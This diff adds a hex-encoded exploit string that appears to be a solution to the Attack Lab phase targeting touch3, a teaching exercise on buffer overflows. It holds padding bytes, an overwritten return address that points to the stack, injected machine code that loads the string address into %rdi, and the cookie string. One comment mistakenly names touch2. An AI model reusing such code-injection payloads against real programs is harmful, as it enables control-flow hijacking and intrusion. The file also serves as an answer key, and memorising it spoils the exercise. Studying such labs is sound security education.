@@ -1,0 +1,14 @@
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+c0 dc 61 55 00 00 00 00   /* the start point of the injected code */
+fa 18 40 00 00 00 00 00   /* the address of the touch3 function */
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+48 c7 c7 d0 dc 61 55      /* set the %rdi as the address of the string to be compared */
+c3                        /* return will pop up the address of touch2 function */
+aa aa aa aa aa aa aa aa
+35 39 62 39 39 37 66 61 00 /* the stored string, the string value could be found by examing the assembly code using gdb in hexmatch function */
+ 
